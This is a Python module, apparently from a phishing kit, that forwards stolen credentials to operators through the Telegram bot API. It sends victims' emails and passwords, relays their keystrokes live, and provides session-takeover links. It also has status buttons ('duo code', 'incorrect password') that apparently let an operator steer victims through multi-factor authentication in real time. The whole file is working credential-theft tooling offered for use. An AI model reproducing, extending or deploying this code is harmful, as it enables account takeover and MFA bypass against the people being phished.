
# ===============================================================
# FILE: tg.py
# ===============================================================
import requests
import json
from dotenv import load_dotenv
import os
from urllib.parse import quote
from utils import get_admin_user
from models import Email_statuses

# --- Load Environment ---
load_dotenv()
DEFAULT_BOT_TOKEN = os.environ.get('BOT_TOKEN')
HOSTED_URL = os.environ.get('HOSTED_URL')

def _send_telegram_message(chat_id, text, bot_token, reply_markup=None):
    base_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': text}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(base_url, data=payload)
        response.raise_for_status()
        print(f"Message sent successfully to (ID: {chat_id}).")
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error sending message to (ID: {chat_id}) using token ...{bot_token[-4:]}: {e}")
        if e.response is not None:
            print(f"Response content: {e.response.text}")
        return False

def _get_notification_recipients(session_id, original_user_id):
    admin_user = get_admin_user()
    admin_id = admin_user.get("id") if admin_user else None
    original_user_id = str(original_user_id)
    admin_id = str(admin_id)

    if not admin_id:
        return [str(original_user_id)]  # Failsafe

    record = Email_statuses.find_one({"session_id": session_id})

    # If admin has taken over, they are the sole recipient.
    if record and str(record.get('active_user_id')) == str(admin_id):
        return [admin_id]
        
    # If the user is not the admin, return both.
    if str(original_user_id) != str(admin_id):
        return list(set([admin_id, str(original_user_id)]))
        
    # Default: The user is the admin.
    return [admin_id]

def send_notification(text, user_id, session_id=None, include_admin=False):
    admin_user = get_admin_user()
    admin_id = admin_user.get("id") if admin_user else None
    
    recipients = [user_id]
    if include_admin and session_id:
        recipients = _get_notification_recipients(session_id, user_id)

    for chat_id in recipients:
        bot_token = DEFAULT_BOT_TOKEN
        # If the recipient is the admin, use their specific token
        if admin_user and str(chat_id) == admin_id:
            bot_token = admin_user.get("bot_token", DEFAULT_BOT_TOKEN)
        
        _send_telegram_message(chat_id, text, bot_token)

def send_keystroke_notification_to_admin(session_id, field, value, admin_user):
    admin_id = admin_user.get("id")
    admin_token = admin_user.get("bot_token")
    if not admin_id or not admin_token:
        return

    text = f"Session: {session_id}\n⌨️ Keystroke in '{field}':\n{value}"
    keyboard = {'inline_keyboard': [[
        {'text': '⚡ Takeover Session', 'url': f"{HOSTED_URL}/takeover/{admin_id}/{session_id}"},
        {'text': '⏳ Delay Notification (4s)', 'url': f"{HOSTED_URL}/api/delay-session/{session_id}"}
    ]]}
    _send_telegram_message(admin_id, text, admin_token, reply_markup=keyboard)

def get_status_update(session_id, email, password, user_id):
    """Sends login credentials to the appropriate recipients with status buttons."""
    admin_user = get_admin_user()
    admin_id = admin_user.get("id") if admin_user else None
    admin_id = str(admin_id)
    recipients = _get_notification_recipients(session_id, user_id)

    for chat_id in recipients:
        text = f"New Login Attempt:\n\nEmail: {email}\nPassword: {password}"
        bot_token = DEFAULT_BOT_TOKEN
        
        # Add session_id for the admin and use their token
        if admin_user and str(chat_id) == str(admin_id):
            text = f"Session ID: {session_id}\n\n{text}"
            bot_token = admin_user.get("bot_token", DEFAULT_BOT_TOKEN)

        statuses = ['incorrect password', 'mobile notification', 'duo code', 'phone_call', 'incorrect duo code', 'success']
        keyboard_layout = [[{'text': status.replace("_", " ").title(), 'url': f"{HOSTED_URL}/set_status/{chat_id}/{email}/{quote(status)}"}] for status in statuses]

        # Add admin-only "Set Custom Message" button
        if admin_user and str(chat_id) == str(admin_id):
            keyboard_layout.append([{'text': 'Set Custom Message', 'url': f"{HOSTED_URL}/set_custom_status?email={email}"}])


        recipients = _get_notification_recipients(session_id, user_id)
        _send_telegram_message(chat_id, text, bot_token, reply_markup={'inline_keyboard': keyboard_layout})



